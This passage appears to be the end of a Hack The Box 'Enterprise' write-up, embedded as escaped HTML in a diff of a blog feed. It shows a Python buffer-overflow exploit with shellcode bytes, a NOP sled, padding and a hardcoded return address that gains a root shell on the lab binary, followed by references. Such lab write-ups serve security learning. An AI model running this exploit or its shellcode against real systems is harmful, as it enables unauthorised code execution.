+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xc9\xb1\x16\x83\xef\xfc\x31\x6f\x15\x03\x6f\x15\x6d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xea\xf5\xe2\x29\x8c\x58\x93\xa1\x83\x3f\xd2\xd6\xb4&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90\x97\x70\x45\x87\x78\xe2\x2c\x39\x0e\x01\xfc\x2d&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x23\xc5\x01\xae\x27\xb5\x21\x81\xc5\x5c\x4c\xf2\x6b&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xff\xe3\x64\x4c\xd0\x77\x18\xfc\x01\x0f\x90\x95\x29&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x8a\x21\x16\xea\x74\xa9\xbe\x61\x1a\x49\x1f\x4d\xd3&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\xa6\x68\x8d\x34\xbd\xfb\xbd\x65\x4a\x76\x54\x0e\xd1&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+ &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x03\xd6\xee\x4e\xbf\x9f\x0e\xbd\xbf&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;struct&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&amp;lt;L'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xffffdd60&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;212&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x90&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;70&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;picarda1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;padding&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nops&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;addr&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is similar to the first approach I tried not including the ENV stuff, but mine was not working for some reasons.&lt;/p&gt;
+
+&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;
+    &lt;table&gt;
+      &lt;tbody&gt;
+        &lt;tr&gt;
+          &lt;td&gt;[HTB: Enterprise&lt;/td&gt;
+          &lt;td&gt;0xdf hacks stuff](https://0xdf.gitlab.io/2021/06/16/htb-enterprise.html#shell-as-root)&lt;/td&gt;
+        &lt;/tr&gt;
+      &lt;/tbody&gt;
+    &lt;/table&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
 </content>
  </entry>
  
